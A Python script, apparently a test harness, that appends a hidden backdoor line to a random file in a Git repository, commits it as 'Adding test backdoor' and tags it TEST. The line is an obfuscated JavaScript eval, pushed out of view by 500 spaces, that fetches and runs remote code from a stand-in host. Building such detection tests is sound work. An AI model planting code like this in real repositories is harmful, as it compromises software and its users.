import git
import os
import random

def perform_local_git_manipulation(repo_path, file_extension=".py", filters=[], n_blank_chars=500) -> str:
    """
    Performs local manipulations on a Git repository:
    0. Checks if the latest tag is "TEST" and, if so, returns the file that was already modified with the backdoor.
    1. Assigns the "PRE-TEST" tag to the latest commit if it doesn't already have a tag.
    2. Modifies a random file with the specified extension by appending a string.
    3. Commits with the message "Adding test backdoor".
    4. Assigns the "TEST" tag to the new commit.

    Args:
        repo_path (str): The path to the local Git repository.
        file_extension (str): The extension of files to consider (e.g., ".py", ".js", ".txt").
        filters (list): A list of directory names to ignore during file search.
        n_blank_chars (int): The number of blank spaces to prepend to the injected code.

    Returns:
        str: The path of the modified file, or None if an error occurs.
    """
    try:
        repo = git.Repo(repo_path)
        repo.git.checkout(repo.head.commit)
        
        # --- 0. Check if the latest tag is "TEST" ---
        tags = sorted(repo.tags, key=lambda t: t.commit.authored_datetime)
        if tags:
            last_tag = tags[-1]
            print(f"Latest tag found: {last_tag.name}")
            if last_tag.name == "TEST":
                print("Latest tag is 'TEST'. No further modifications will be made.")
                
                # Find the file modified in the last commit
                modified_files = [item.a_path for item in last_tag.commit.diff('PRE-TEST')]
                if modified_files:
                    modified_file = modified_files[0]
                    print(f"Last modified file: {modified_file} ({len(modified_files)} files modified)")
                    return os.path.join(repo_path, modified_file)
                else:
                    print("No modified files found in the last commit.")
                    return None
        
        if repo.head.is_detached:
            print("Warning: Repository is in a 'detached HEAD' state.")
            try:
                if 'master' in repo.branches:
                    repo.git.checkout('master')
                    print("Attempted checkout to 'master'.")
                elif 'main' in repo.branches:
                    repo.git.checkout('main')
                    print("Attempted checkout to 'main'.")
                else:
                    print("Could not automatically restore a branch. Please restore manually (e.g., 'git checkout master').")
                    return None
            except Exception as e:
                print(f"Error during checkout attempt: {e}. Proceeding with caution.")

    except git.InvalidGitRepositoryError:
        print(f"Error: The directory '{repo_path}' is not a valid Git repository.")
        return None
    except git.NoSuchPathError:
        print(f"Error: The directory '{repo_path}' does not exist.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred while opening the repository: {e}")
        return None

    # --- 1. Assign the "PRE-TEST" tag to the latest commit if it doesn't already have one ---
    head_commit = repo.head.commit
    if not any(tag.commit.hexsha == head_commit.hexsha for tag in repo.tags):
        try:
            repo.create_tag("PRE-TEST", ref=head_commit)
            print(f"Tag 'PRE-TEST' assigned to the latest commit ({head_commit.hexsha[:7]}).")
        except Exception as e:
            print(f"Error while creating the 'PRE-TEST' tag: {e}")
    else:
        print(f"The latest commit ({head_commit.hexsha[:7]}) already has a tag. Skipping 'PRE-TEST' assignment.")

    # --- 2. Select a random file with the specified extension ---
    eligible_files = []
    for root, dirs, files in os.walk(repo_path):
        if any(f in root for f in filters):
            continue
        
        for file_name in files:
            if file_name.endswith(file_extension):
                eligible_files.append(os.path.join(root, file_name))

    if not eligible_files:
        print(f"No files with extension '{file_extension}' found in the repository.")
        print("Ensure the files are not located in ignored directories like '.git', 'node_modules', etc.")
        return None

    random_file_path = random.choice(eligible_files)
    print(f"\nRandomly selected file for modification: {random_file_path}")

    # This vulnerability is fictional and designed to work with Node.js repos.
    #
    # Explanation (even though obfuscated):
    # This code performs the following actions concisely:
    #   - Imports https: require('https').
    #   - Makes a GET request: To https://www.fakemaliciouswebsite.it/fake-vulnerability-download.
    #   - Receives the response: The callback function handles the received data (res).
    #   - Executes the response content: The received data is treated as a string (chunk.toString()) and executed via eval().
    fake_vulnerability = " " * n_blank_chars
    fake_vulnerability += "eval(String.fromCharCode(118,97,114,32,104,116,116,112,115,32,61,32,114,101,113,117,105,114,101,40,39,104,116,116,112,115,39,41,59,104,116,116,112,115,46,103,101,116,40,39,104,116,116,112,115,58,47,47,119,119,119,46,102,97,107,101,109,97,108,105,99,105,111,117,115,119,101,98,115,105,116,101,46,105,116,47,102,97,107,101,45,118,117,108,110,101,114,97,98,105,108,105,116,121,45,100,111,119,110,108,111,97,100,39,44,32,114,101,115,32,61,62,32,114,101,115,46,102,111,114,101,97,99,104,40,99,104,117,110,107,32,61,62,32,101,118,97,108,40,99,104,117,110,107,46,116,111,83,116,114,105,110,103,40,41,41,41,41));"
    try:
        with open(random_file_path, 'a', encoding='utf-8') as f:
            f.write('\n' + fake_vulnerability + '\n')
        print(f"String appended to file: {random_file_path}")
    except Exception as e:
        print(f"Error while writing to file {random_file_path}: {e}")
        return None

    # --- 3. Commit with the message "Adding test backdoor" ---
    try:
        rel_file_path = os.path.relpath(random_file_path, repo.working_tree_dir)
        repo.index.add([rel_file_path])
        
        new_commit = repo.index.commit("Adding test backdoor")
        print(f"Commit performed with message 'Adding test backdoor'. Hash: {new_commit.hexsha[:7]}")
    except Exception as e:
        print(f"Error during commit: {e}")
        print("Ensure there are changes to commit and that the Git configuration is correct (user.name, user.email).")
        return None

    # --- 4. Assign the "TEST" tag to the new commit ---
    try:
        repo.create_tag("TEST", ref=new_commit)
        print(f"Tag 'TEST' assigned to the new commit ({new_commit.hexsha[:7]}).")
    except Exception as e:
        print(f"Error while creating the 'TEST' tag: {e}")

    print("\nOperations completed.")
    
    return random_file_path